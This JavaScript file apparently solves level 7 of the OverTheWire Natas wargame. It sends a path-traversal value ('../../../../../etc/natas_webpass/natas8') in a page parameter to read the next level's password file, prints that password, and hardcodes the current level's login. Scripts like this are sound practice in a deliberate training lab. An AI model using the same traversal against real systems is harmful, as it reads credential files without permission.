import axios from 'axios';

let username = 'natas7',
        password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9',
        pattern = /<br>\n(.*)\n\n<!--/,
        url = `http://${username}.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8`;


try {
                                                                                                                                                
  let response = await axios.get(url, {auth: { username, password }});
  let result = response.data.match(pattern);
  console.log(result[1]);

} catch (e) {
    console.error(e);
}

